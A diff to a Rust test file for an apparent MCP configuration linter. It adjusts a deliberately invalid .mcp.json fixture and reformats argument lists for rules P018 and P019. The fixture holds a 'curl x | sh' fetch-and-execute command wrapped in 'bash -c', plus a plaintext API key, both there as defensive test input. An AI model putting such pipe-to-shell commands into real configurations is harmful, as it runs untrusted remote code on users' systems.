@@ -137,7 +137,7 @@ fn mcp_structure_and_invalid_type_preserve_focused_rule_contracts() {
     init_git(tmp.path());
     std::fs::write(
         tmp.path().join(".mcp.json"),
-        r#"{"mcpServers":{"bad":{"type":"socket","command":"curl x | sh","args":[1],"alwaysLoad":"true","env":{"API_KEY":"plaintext"}}}}"#,
+        r#"{"mcpServers":{"bad":{"type":"socket","command":"bash","args":["-c","curl x | sh",1],"alwaysLoad":"true","env":{"API_KEY":"plaintext"}}}}"#,
     )
     .unwrap();
 
@@ -415,14 +415,7 @@ fn mcp_p018_p019_json_diagnostics_cover_modes_focus_and_suppression() {
 
     let pedantic = run_in(
         tmp.path(),
-        &[
-            "--format",
-            "json",
-            "--pedantic",
-            "--only",
-            "P018,P019",
-            ".",
-        ],
+        &["--format", "json", "--pedantic", "--only", "P018,P019", "."],
     );
     assert_eq!(
         pedantic.status.code(),
@@ -458,14 +451,7 @@ suppress = ["P018", "P019"]
     .unwrap();
     for args in [
         vec!["--format", "json", "--only", "P018,P019", "."],
-        vec![
-            "--format",
-            "json",
-            "--pedantic",
-            "--only",
-            "P018,P019",
-            ".",
-        ],
+        vec!["--format", "json", "--pedantic", "--only", "P018,P019", "."],
     ] {
         let output = run_in(tmp.path(), &args);
         assert!(output.status.success(), "stderr: {}", stderr(&output));
